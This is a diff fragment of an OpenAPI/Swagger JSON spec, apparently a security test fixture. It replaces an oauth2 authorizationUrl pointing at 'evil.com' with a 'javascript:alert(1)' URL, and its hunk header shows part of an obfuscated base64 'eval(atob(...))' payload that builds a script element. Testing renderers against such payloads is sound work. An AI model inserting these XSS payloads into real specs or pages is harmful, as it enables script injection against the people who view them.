@@ -32,7 +32,7 @@ a');location=`javascript:eval(atob('dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnc2Ny
   "securityDefinitions": {
     "oauth2": {
       "flow": "implicit",
-      "authorizationUrl": "https://evil.com",
+      "authorizationUrl": "javascript:alert(1)/////@",
       "scopes": {
         "web-api": "testing"
       },
